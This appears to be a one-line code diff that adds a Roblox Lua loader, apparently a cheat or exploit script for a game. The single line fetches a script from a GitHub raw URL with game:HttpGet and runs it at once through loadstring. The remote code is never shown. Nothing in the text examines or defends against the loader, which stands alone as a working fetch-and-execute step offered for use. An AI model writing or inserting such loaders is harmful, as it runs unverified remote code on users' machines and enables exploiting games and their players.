@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BudgieRectifier/loaders/main/loaders/helmets-scooter-empire-spam6-erb1ilk0jf7u5z.lua"))()
